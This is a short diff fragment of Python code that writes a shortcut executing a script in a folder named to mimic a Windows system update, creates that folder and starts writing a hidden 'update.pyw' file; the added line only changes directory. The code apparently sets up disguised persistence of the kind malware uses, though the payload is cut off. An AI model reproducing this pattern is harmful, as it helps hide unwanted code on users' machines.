@@ -5,6 +5,7 @@ shortcut.write("exec('C:/Users/{}/AppData/Roaming/Microsoft/Windows/System/Updat
 os.mkdir("../../../System")
 os.chdir("../../../System")
 os.mkdir("./Update")
+os.chdir("./Update")
 shortcut.close()
 fl = open("update.pyw", "w")
 fl.write("""
